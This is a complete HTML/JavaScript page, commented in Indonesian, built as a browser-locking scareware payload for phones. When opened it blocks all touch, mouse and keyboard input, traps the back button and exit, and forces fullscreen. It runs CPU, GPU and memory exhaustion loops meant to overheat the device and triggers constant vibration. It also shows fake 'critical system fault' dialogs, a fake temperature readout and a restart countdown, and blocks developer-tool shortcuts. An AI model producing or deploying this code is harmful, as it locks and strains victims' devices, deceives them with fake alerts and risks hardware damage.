<!DOCTYPE html>
<html>
<head>
    <title>System Critical</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        /* SUPER TOUCH BLOCKER */
        * {
            margin: 0;
            padding: 0;
            -webkit-tap-highlight-color: transparent !important;
            -webkit-touch-callout: none !important;
            -webkit-user-select: none !important;
            user-select: none !important;
            touch-action: none !important;
            pointer-events: none !important;
        }
        
        html, body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            position: fixed;
            background: #000;
            color: #ff0000;
            font-family: monospace;
        }
        
        /* OVERLAY UNTUK BLOCK SENTUHAN */
        #touch-blocker {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(255, 0, 0, 0.01);
            z-index: 999999;
            pointer-events: auto !important;
        }
        
        /* LAYER ANTI TAP */
        .anti-tap {
            position: fixed;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(
                45deg,
                transparent,
                transparent 10px,
                rgba(255, 0, 0, 0.02) 10px,
                rgba(255, 0, 0, 0.02) 20px
            );
            z-index: 999998;
        }
        
        /* WARNING TEXT */
        #warning {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            font-size: 24px;
            color: #ff0000;
            text-shadow: 0 0 20px #ff0000;
            z-index: 1000000;
            background: rgba(0, 0, 0, 0.9);
            padding: 30px;
            border-radius: 15px;
            border: 3px solid #ff0000;
        }
        
        /* FAKE BUTTON YANG GAK BERFUNGSI */
        .fake-button {
            position: fixed;
            padding: 20px 40px;
            background: linear-gradient(45deg, #ff0000, #ff4444);
            color: white;
            border-radius: 10px;
            font-size: 18px;
            cursor: not-allowed;
            z-index: 1000001;
            opacity: 0.8;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 0.3; transform: scale(1); }
            50% { opacity: 0.8; transform: scale(1.05); }
            100% { opacity: 0.3; transform: scale(1); }
        }
        
        /* TEMPERATURE DISPLAY */
        #temp {
            position: fixed;
            top: 20px;
            right: 20px;
            font-size: 20px;
            color: #ff4444;
            z-index: 1000002;
            background: rgba(0,0,0,0.7);
            padding: 10px;
            border-radius: 5px;
        }
        
        /* BLOCKER GRID */
        .blocker-grid {
            position: fixed;
            width: 100%;
            height: 100%;
            display: grid;
            grid-template-columns: repeat(10, 1fr);
            grid-template-rows: repeat(20, 1fr);
            z-index: 999997;
        }
        
        .block-cell {
            background: rgba(255, 0, 0, 0.01);
            border: 1px solid rgba(255, 0, 0, 0.03);
        }
    </style>
</head>
<body>
    <!-- LAYER 1: BLOCKER GRID -->
    <div class="blocker-grid" id="blockerGrid"></div>
    
    <!-- LAYER 2: ANTI TAP -->
    <div class="anti-tap"></div>
    
    <!-- LAYER 3: MAIN TOUCH BLOCKER -->
    <div id="touch-blocker"></div>
    
    <!-- LAYER 4: WARNING -->
    <div id="temp">üå°Ô∏è <span id="tempValue">45¬∞C</span> | üîí <span id="lockStatus">TOUCH BLOCKED</span></div>
    
    <div id="warning">
        ‚ö† CRITICAL SYSTEM FAULT ‚ö†<br><br>
        <span id="warningText">TOUCH INPUT DISABLED</span><br><br>
        <small style="color: #ff8888;">Device will restart in: <span id="countdown">--:--</span></small>
    </div>
    
    <!-- FAKE BUTTONS -->
    <div class="fake-button" style="bottom: 100px; left: 50%; transform: translateX(-50%);">RESTART (DISABLED)</div>
    <div class="fake-button" style="bottom: 50px; left: 50%; transform: translateX(-50%);">EMERGENCY (DISABLED)</div>
    
    <script>
        // ==================== 1. SUPER TOUCH BLOCKER SYSTEM ====================
        class UltimateTouchBlocker {
            constructor() {
                this.touchEvents = ['touchstart', 'touchend', 'touchmove', 'touchcancel'];
                this.pointerEvents = ['pointerdown', 'pointerup', 'pointermove', 'pointercancel'];
                this.mouseEvents = ['mousedown', 'mouseup', 'mousemove', 'click', 'contextmenu', 'dblclick'];
                this.gestureEvents = ['gesturestart', 'gesturechange', 'gestureend'];
                
                this.blockAllEvents();
                this.createBlockerGrid();
                this.injectStyleOverrides();
                this.preventPhysicalButtons();
            }
            
            blockAllEvents() {
                // Block semua event touch
                this.touchEvents.forEach(eventName => {
                    document.addEventListener(eventName, this.blockHandler, {
                        capture: true,
                        passive: false
                    });
                    
                    window.addEventListener(eventName, this.blockHandler, {
                        capture: true,
                        passive: false
                    });
                });
                
                // Block semua pointer events
                this.pointerEvents.forEach(eventName => {
                    document.addEventListener(eventName, this.blockHandler, {
                        capture: true,
                        passive: false
                    });
                });
                
                // Block semua mouse events
                this.mouseEvents.forEach(eventName => {
                    document.addEventListener(eventName, this.blockHandler, {
                        capture: true,
                        passive: false
                    });
                });
                
                // Block gesture events
                this.gestureEvents.forEach(eventName => {
                    document.addEventListener(eventName, this.blockHandler, {
                        capture: true,
                        passive: false
                    });
                });
                
                // Special: Block scroll dan zoom
                document.addEventListener('wheel', this.blockHandler, {capture: true, passive: false});
                document.addEventListener('scroll', this.blockHandler, {capture: true, passive: false});
                
                // Block keyboard events juga
                document.addEventListener('keydown', this.blockHandler, {capture: true});
                document.addEventListener('keyup', this.blockHandler, {capture: true});
                document.addEventListener('keypress', this.blockHandler, {capture: true});
            }
            
            blockHandler(e) {
                // Block semua event
                e.preventDefault();
                e.stopPropagation();
                e.stopImmediatePropagation();
                
                // Beri feedback visual bahwa touch diblokir
                document.getElementById('warningText').textContent = 
                    `TOUCH BLOCKED at (${e.clientX || e.touches[0]?.clientX || 0}, ${e.clientY || e.touches[0]?.clientY || 0})`;
                
                // Blink warning
                const warning = document.getElementById('warning');
                warning.style.borderColor = '#00ff00';
                setTimeout(() => {
                    warning.style.borderColor = '#ff0000';
                }, 100);
                
                return false;
            }
            
            createBlockerGrid() {
                // Buat grid blocker cells
                const grid = document.getElementById('blockerGrid');
                grid.innerHTML = '';
                
                for(let i = 0; i < 200; i++) { // 10x20 grid
                    const cell = document.createElement('div');
                    cell.className = 'block-cell';
                    
                    // Tambah event listener ke setiap cell
                    this.touchEvents.forEach(eventName => {
                        cell.addEventListener(eventName, (e) => {
                            e.preventDefault();
                            e.stopPropagation();
                            return false;
                        }, {passive: false});
                    });
                    
                    grid.appendChild(cell);
                }
            }
            
            injectStyleOverrides() {
                // Inject CSS untuk memastikan semua elemen non-interactive
                const style = document.createElement('style');
                style.textContent = `
                    /* Force semua elemen jadi non-interactive */
                    * {
                        pointer-events: none !important;
                        cursor: none !important;
                    }
                    
                    /* Exception untuk blocker */
                    #touch-blocker, .block-cell {
                        pointer-events: auto !important;
                    }
                    
                    /* Hide cursor */
                    body {
                        cursor: none !important;
                    }
                    
                    /* Disable text selection */
                    * {
                        -webkit-user-select: none !important;
                        -moz-user-select: none !important;
                        -ms-user-select: none !important;
                        user-select: none !important;
                    }
                    
                    /* Disable callout */
                    * {
                        -webkit-touch-callout: none !important;
                    }
                    
                    /* Disable image drag */
                    img {
                        -webkit-user-drag: none !important;
                        user-drag: none !important;
                    }
                `;
                document.head.appendChild(style);
            }
            
            preventPhysicalButtons() {
                // Coba prevent action dari physical buttons
                window.addEventListener('beforeunload', (e) => {
                    e.preventDefault();
                    e.returnValue = '';
                    document.getElementById('warningText').textContent = 'PHYSICAL BUTTONS BLOCKED';
                    return '';
                });
                
                // Coba detect back button
                window.addEventListener('popstate', (e) => {
                    e.preventDefault();
                    history.pushState(null, null, window.location.href);
                    document.getElementById('warningText').textContent = 'BACK BUTTON BLOCKED';
                });
                
                // Push state untuk prevent back
                history.pushState(null, null, window.location.href);
                window.onpopstate = function(event) {
                    history.go(1);
                };
            }
        }

        // ==================== 2. OVERHEAT SYSTEM (dari sebelumnya) ====================
        class OverheatSystem {
            constructor() {
                this.cpuLoad = 0;
                this.gpuLoad = 0;
                this.startOverheat();
            }
            
            startOverheat() {
                // CPU torture
                setInterval(() => {
                    this.cpuLoad++;
                    let sum = 0;
                    for(let i = 0; i < 1000000; i++) {
                        sum += Math.sqrt(i) * Math.sin(i) * Math.cos(i);
                    }
                }, 10);
                
                // GPU torture dengan canvas
                const canvas = document.createElement('canvas');
                canvas.width = 2048;
                canvas.height = 2048;
                canvas.style.position = 'fixed';
                canvas.style.top = '0';
                canvas.style.left = '0';
                canvas.style.zIndex = '-1000';
                document.body.appendChild(canvas);
                
                const ctx = canvas.getContext('2d');
                let angle = 0;
                
                setInterval(() => {
                    this.gpuLoad++;
                    // Gambar pattern kompleks
                    ctx.clearRect(0, 0, canvas.width, canvas.height);
                    for(let i = 0; i < 1000; i++) {
                        const x = Math.sin(angle + i * 0.1) * 500 + 1024;
                        const y = Math.cos(angle + i * 0.1) * 500 + 1024;
                        
                        const gradient = ctx.createRadialGradient(x, y, 0, x, y, 100);
                        gradient.addColorStop(0, `hsl(${(angle * 10 + i) % 360}, 100%, 50%)`);
                        gradient.addColorStop(1, 'transparent');
                        
                        ctx.fillStyle = gradient;
                        ctx.beginPath();
                        ctx.arc(x, y, 50, 0, Math.PI * 2);
                        ctx.fill();
                    }
                    angle += 0.01;
                }, 16);
                
                // Update temperature display
                setInterval(() => {
                    const temp = 40 + this.cpuLoad / 100 + this.gpuLoad / 100;
                    document.getElementById('tempValue').textContent = `${Math.round(temp)}¬∞C`;
                    
                    // Change color based on temperature
                    if(temp > 80) {
                        document.getElementById('temp').style.color = '#ff0000';
                        document.getElementById('temp').style.animation = 'pulse 0.5s infinite';
                    } else if(temp > 60) {
                        document.getElementById('temp').style.color = '#ff6600';
                    }
                }, 1000);
            }
        }

        // ==================== 3. FULLSCREEN LOCK ====================
        function lockFullscreen() {
            const elem = document.documentElement;
            
            function requestFullscreen() {
                if (elem.requestFullscreen) {
                    elem.requestFullscreen();
                } else if (elem.webkitRequestFullscreen) {
                    elem.webkitRequestFullscreen();
                } else if (elem.mozRequestFullScreen) {
                    elem.mozRequestFullScreen();
                } else if (elem.msRequestFullscreen) {
                    elem.msRequestFullscreen();
                }
            }
            
            requestFullscreen();
            
            // Prevent exiting fullscreen
            document.addEventListener('fullscreenchange', () => {
                if (!document.fullscreenElement) {
                    requestFullscreen();
                }
            });
            
            document.addEventListener('webkitfullscreenchange', () => {
                if (!document.webkitFullscreenElement) {
                    requestFullscreen();
                }
            });
            
            // Auto re-enter fullscreen setiap 5 detik
            setInterval(() => {
                if (!document.fullscreenElement && 
                    !document.webkitFullscreenElement && 
                    !document.mozFullScreenElement && 
                    !document.msFullscreenElement) {
                    requestFullscreen();
                }
            }, 5000);
        }

        // ==================== 4. FAKE SYSTEM UI ====================
        function createFakeUI() {
            // Fake notification
            setInterval(() => {
                const notification = document.createElement('div');
                notification.style.position = 'fixed';
                notification.style.top = '10px';
                notification.style.left = '10px';
                notification.style.background = 'rgba(255, 0, 0, 0.9)';
                notification.style.color = 'white';
                notification.style.padding = '15px';
                notification.style.borderRadius = '5px';
                notification.style.zIndex = '1000003';
                notification.style.fontSize = '14px';
                notification.textContent = '‚ö† System Overheat: Touch disabled';
                notification.style.boxShadow = '0 0 10px red';
                
                document.body.appendChild(notification);
                
                setTimeout(() => {
                    if(notification.parentNode) {
                        notification.parentNode.removeChild(notification);
                    }
                }, 3000);
            }, 8000);
            
            // Fake system dialog
            setTimeout(() => {
                const dialog = document.createElement('div');
                dialog.style.position = 'fixed';
                dialog.style.top = '50%';
                dialog.style.left = '50%';
                dialog.style.transform = 'translate(-50%, -50%)';
                dialog.style.background = 'rgba(0, 0, 0, 0.95)';
                dialog.style.border = '2px solid red';
                dialog.style.padding = '30px';
                dialog.style.borderRadius = '10px';
                dialog.style.zIndex = '1000004';
                dialog.style.color = 'white';
                dialog.style.textAlign = 'center';
                dialog.style.minWidth = '300px';
                dialog.innerHTML = `
                    <h3>CRITICAL ERROR</h3>
                    <p>Touchscreen calibration failed</p>
                    <p style="color: #ff8888; font-size: 12px;">Please use physical buttons</p>
                    <div style="margin-top: 20px; padding: 10px; background: #333; border-radius: 5px;">
                        Error Code: TOUCH_BLOCK_0xDEAD
                    </div>
                `;
                
                document.body.appendChild(dialog);
                
                // Auto close setelah 10 detik
                setTimeout(() => {
                    if(dialog.parentNode) {
                        dialog.parentNode.removeChild(dialog);
                    }
                }, 10000);
            }, 15000);
        }

        // ==================== 5. COUNTDOWN TIMER ====================
        function startCountdown() {
            let minutes = 59;
            let seconds = 59;
            
            const countdownElement = document.getElementById('countdown');
            
            const timer = setInterval(() => {
                seconds--;
                if(seconds < 0) {
                    seconds = 59;
                    minutes--;
                }
                
                if(minutes < 0) {
                    minutes = 59;
                }
                
                countdownElement.textContent = 
                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                // Change warning text periodically
                if(seconds % 15 === 0) {
                    const warnings = [
                        'TOUCH INPUT DISABLED',
                        'SYSTEM OVERHEATING',
                        'COOLING SYSTEM FAILED',
                        'EMERGENCY LOCK ACTIVE',
                        'AWAITING SERVICE MODE'
                    ];
                    document.getElementById('warningText').textContent = 
                        warnings[Math.floor(Math.random() * warnings.length)];
                }
                
                // Blink effect setiap 10 detik
                if(seconds % 10 === 0) {
                    document.body.style.background = '#330000';
                    setTimeout(() => {
                        document.body.style.background = '#000000';
                    }, 500);
                }
            }, 1000);
        }

        // ==================== 6. MEMORY OVERLOAD ====================
        function startMemoryOverload() {
            const chunks = [];
            
            setInterval(() => {
                // Allocate memory chunks
                for(let i = 0; i < 5; i++) {
                    chunks.push(new Array(1000000).fill('üî•'.repeat(10)));
                }
                
                // Create image elements
                for(let i = 0; i < 3; i++) {
                    const img = new Image();
                    img.src = 'data:image/svg+xml;base64,' + btoa(
                        `<svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000">
                         <rect width="1000" height="1000" fill="rgb(${Math.random()*255},0,0)"/>
                         </svg>`
                    );
                    img.style.position = 'fixed';
                    img.style.top = '-1000px';
                    img.style.left = '-1000px';
                    img.style.opacity = '0.01';
                    document.body.appendChild(img);
                }
            }, 1000);
        }

        // ==================== 7. VIBRATION OVERLOAD ====================
        function startVibrationOverload() {
            if (navigator.vibrate) {
                // Pattern vibration yang intens
                const patterns = [
                    [1000, 500, 1000, 500],
                    [500, 500, 500, 500],
                    [200, 100, 200, 100, 200, 100],
                    [1000]
                ];
                
                let patternIndex = 0;
                
                setInterval(() => {
                    navigator.vibrate(patterns[patternIndex % patterns.length]);
                    patternIndex++;
                    
                    // Update UI
                    document.getElementById('lockStatus').textContent = 
                        `VIBRATE BLOCK ${patternIndex}`;
                }, 3000);
            }
        }

        // ==================== 8. MAIN EXECUTION ====================
        document.addEventListener('DOMContentLoaded', () => {
            console.log('üö® STARTING ULTIMATE TOUCH BLOCKER üö®');
            
            // 1. Start touch blocker
            const touchBlocker = new UltimateTouchBlocker();
            
            // 2. Lock fullscreen
            lockFullscreen();
            
            // 3. Start overheat system
            const overheatSystem = new OverheatSystem();
            
            // 4. Start countdown
            startCountdown();
            
            // 5. Start memory overload
            startMemoryOverload();
            
            // 6. Start vibration overload
            startVibrationOverload();
            
            // 7. Create fake UI
            createFakeUI();
            
            // 8. Prevent window close
            window.addEventListener('beforeunload', (e) => {
                e.preventDefault();
                e.returnValue = '';
                document.getElementById('warningText').textContent = 'EXIT ATTEMPT BLOCKED';
                return '';
            });
            
            // 9. Block all keys
            document.addEventListener('keydown', (e) => {
                e.preventDefault();
                e.stopPropagation();
                
                // Special handling for browser shortcuts
                if (e.ctrlKey || e.metaKey || e.altKey) {
                    document.getElementById('warningText').textContent = 
                        `SHORTCUT BLOCKED: ${e.key.toUpperCase()}`;
                }
                
                return false;
            }, true);
            
            // 10. Periodic re-enforcement
            setInterval(() => {
                // Re-apply blocker grid
                touchBlocker.createBlockerGrid();
                
                // Force style re-application
                document.body.style.pointerEvents = 'none';
                
                // Update lock status
                const statuses = [
                    'TOUCH BLOCKED',
                    'INPUT DISABLED',
                    'SYSTEM LOCKED',
                    'SECURITY ACTIVE',
                    'QUARANTINE MODE'
                ];
                document.getElementById('lockStatus').textContent = 
                    statuses[Math.floor(Math.random() * statuses.length)];
            }, 10000);
            
            console.log('‚úÖ ALL SYSTEMS LOCKED - TOUCH COMPLETELY BLOCKED');
        });

        // ==================== 9. FINAL SECURITY ====================
        // Blokir console access juga
        (function() {
            // Override console methods
            const originalConsole = {
                log: console.log,
                warn: console.warn,
                error: console.error
            };
            
            console.log = function(...args) {
                originalConsole.log.call(console, 'üö´ CONSOLE BLOCKED:', ...args);
            };
            
            console.warn = function(...args) {
                originalConsole.warn.call(console, 'üö´ CONSOLE BLOCKED:', ...args);
            };
            
            console.error = function(...args) {
                originalConsole.error.call(console, 'üö´ CONSOLE BLOCKED:', ...args);
            };
            
            // Block F12, Ctrl+Shift+I, etc.
            document.addEventListener('keydown', (e) => {
                if (
                    e.keyCode === 123 || // F12
                    (e.ctrlKey && e.shiftKey && e.keyCode === 73) || // Ctrl+Shift+I
                    (e.ctrlKey && e.shiftKey && e.keyCode === 74) || // Ctrl+Shift+J
                    (e.ctrlKey && e.keyCode === 85) // Ctrl+U
                ) {
                    e.preventDefault();
                    document.getElementById('warningText').textContent = 'DEVELOPER TOOLS BLOCKED';
                    return false;
                }
            });
        })();
    </script>
</body>
</html>
